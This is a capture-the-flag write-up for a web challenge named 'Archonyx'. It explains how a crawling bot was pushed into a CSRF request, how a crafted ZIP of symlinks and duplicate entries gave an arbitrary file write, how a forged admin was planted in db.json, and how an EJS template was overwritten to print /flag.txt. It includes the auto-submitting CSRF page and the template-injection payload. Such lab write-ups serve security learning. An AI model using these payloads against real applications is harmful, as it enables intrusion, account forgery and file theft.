# Archonyx CTF Write-up: Zero to Root

**Author:** Mohammed Ali Abdul Muhsin  
**Bio:** Cybersecurity Engineering Student | Digital Forensics Specialist | Full-Pwn Enthusiast  
---

## Challenge Info

- **Name:** `Archonyx`
- **Category:** Web
- **Final Flag:** `HTB{wh4t_th3_l3dg3r_cl34rs_th3_c04st_b3l13v3s_027b9b1e457a35da05c917f6c5595187}`

## Overview

The challenge relied on a multi-step exploit chain:

1. Using the `/report` endpoint to force the bot to visit an external URL.
2. Exploiting the fact that the bot runs inside the container on `127.0.0.1:1337` rather than the public host.
3. Executing a CSRF attack against `/api/fetch`.
4. Abusing the `download`/`decompress` functionality to extract a malicious ZIP archive, achieving an arbitrary file write inside the application.
5. Overwriting `db.json` to add a forged user with `ledgermaster` privileges.
6. Logging in with this newly created user.
7. Leveraging the same file write primitive again to extract the flag from `/flag.txt`.

---

## Source Review

After reviewing the provided source code, the following key details emerged:

- The bot logic is located in: `services/bot.js`
- The bot visits any URL submitted via `/report`.
- Prior to visiting the URL, it sets a JWT cookie for the `bot` user.
- This cookie is scoped to: `http://${appHost}:${port}/`

From `config/index.js`, we can see:
- `appHost = 127.0.0.1`
- `port = 1337`

This was the most critical realization in the challenge. Any requests we want the bot to execute must be directed to `http://127.0.0.1:1337` internally, not to the external public server address.

---

## Important Routes

### 1) `/report`
This endpoint accepts an external link and calls:
- `bot.visit(url)`

This provides us with an SSRF-like browser interaction via the headless bot.

### 2) `/api/fetch`
Located in `controllers/apiController.js`:
- Requires an active session or an `x-api-key`.
- Downloads content from an external URL.
- Immediately extracts the ZIP content.

Crucially, it calls:
- `uploadService.downloadAndExtract(url, extractDir)`

And inside `services/uploadService.js`:
- `download(url, extractDir, { extract: true })`

This serves as our primary exploitation primitive.

### 3) `/ledgermaster/render`
This route initially looked promising because `Less` allows for local file imports. However, the controller does not return the final rendered output; it simply returns:
- `"Seal cast"`

Therefore, this was not a viable path for final data exfiltration.

---

## Main Vulnerability

The core vulnerability stems from the use of:
- `download@8`
- with `{ extract: true }`

This is done without safely inspecting the archive prior to extraction in `/api/fetch`. 

We exploited this by crafting a malicious ZIP archive utilizing:
- duplicate entries
- symlink entries

This granted us an arbitrary file write primitive inside the application directory. 

**The concept:**
- The first entry is a symlink with a fixed name, pointing to the target file.
- The second entry, bearing the exact same name, writes our desired payload.

Using this technique, we could reliably overwrite sensitive files inside the `/app` directory.

---

## Step 1: Create a malicious ZIP to overwrite `db.json`

We crafted a malicious ZIP intended to overwrite:
`/app/data/db.json`

The payload was a new database containing our forged user:
- **username:** `marrowadmin`
- **password:** `MarrowPass123!`
- **role:** `ledgermaster`
- **verified:** `true`
- **apiKey:** `ownrelay`

The application reads its user base directly from `data/db.json`, meaning that immediately after the overwrite, our forged user legitimately exists within the system.

---

## Step 2: Host the ZIP

We hosted the malicious ZIP on Sitebin to obtain a direct download link, such as:
- `https://...app.sitebin.io/pwn.zip`

---

## Step 3: Use the bot to submit a CSRF request to `/api/fetch`

We set up an external page on `shipped.page` running over HTTP. We needed a page the bot could visit that would execute JavaScript to auto-submit our payload.

The page content was roughly:

```html
<!doctype html>
<html>
  <body>
    <form id="f" method="POST" action="http://127.0.0.1:1337/api/fetch">
      <input name="url" value="https://...app.sitebin.io/pwn.zip">
    </form>
    <script>document.getElementById('f').submit()</script>
  </body>
</html>
```

We submitted this link to `/report`. The bot visited the page and triggered the internal request using the `bot` user's session.

---

## Step 4: Login as the forged ledgermaster user

Following the successful overwrite, we were able to log in using our planted credentials:
- `marrowadmin / MarrowPass123!`

This also granted us access to our forged API key:
- `ownrelay`

---

## Step 5: Why the first extraction idea changed

Initially, the plan was to extract the flag via `/ledgermaster/render` using a `Less` local import. 

However, because the controller does not display the final output, even if `/flag.txt` was successfully read inside `Less`, it would never be returned in the HTTP response.

Consequently, the cleanest solution was to reuse our arbitrary file write primitive.

---

## Step 6: Overwrite an EJS template and print `/flag.txt`

With the arbitrary file write confirmed, we created a second malicious ZIP targeting:
`/app/views/verify.ejs`

We injected a simple EJS template payload:

```ejs
<%= global.process.mainModule.require("fs").readFileSync("/flag.txt","utf8") %>
```

We then called `/api/fetch` again, but this time directly, authenticating with our forged API key:
- `x-api-key: ownrelay`

After overwriting the template, we navigated to:
- `/verify`

The template executed successfully, and the flag was rendered directly on the page.

---

## Final Flag

`HTB{wh4t_th3_l3dg3r_cl34rs_th3_c04st_b3l13v3s_027b9b1e457a35da05c917f6c5595187}`

---

## Key Lessons

### 1) Public host ≠ internal host
The most crucial takeaway from this challenge is that the bot does not use the public IP as the application's internal reference. The true reference was `127.0.0.1:1337`.

### 2) `download(..., { extract: true })` is highly dangerous
Extracting an untrusted ZIP archive directly into an application directory provides an excellent attack surface for symlink abuse, duplicate entries, and arbitrary file overwrites.

### 3) A sink is not enough; you must secure an exfiltration path
While `less.render()` with local file imports seemed sufficient, the lack of the final output in the HTTP response meant it wasn't a viable path for exfiltration.

---

## Short Exploit Chain

1. Craft a malicious ZIP to overwrite `/app/data/db.json`.
2. Host the ZIP on an external server.
3. Create an external CSRF page targeting `http://127.0.0.1:1337/api/fetch`.
4. Submit the CSRF page link to `/report`.
5. Log in using the `marrowadmin` account.
6. Craft a second malicious ZIP to overwrite `/app/views/verify.ejs`.
7. Call `/api/fetch` directly using `x-api-key: ownrelay`.
8. Navigate to `/verify`.
9. Retrieve the flag.

---

## Useful Artifacts

- **Forged Admin User:** `marrowadmin` / `MarrowPass123!`
- **Forged API Key:** `ownrelay`
- **Internal Target Used by Bot:** `http://127.0.0.1:1337`

---

## Conclusion

This was an elegant challenge because it required more than just identifying a ZIP extraction bug. It demanded chaining bot behavior, internal host discovery, CSRF, archive extraction abuse, file overwrites, and final data exfiltration. The defining moment was identifying that the bot needed to target `127.0.0.1:1337` internally, rather than the external service address.
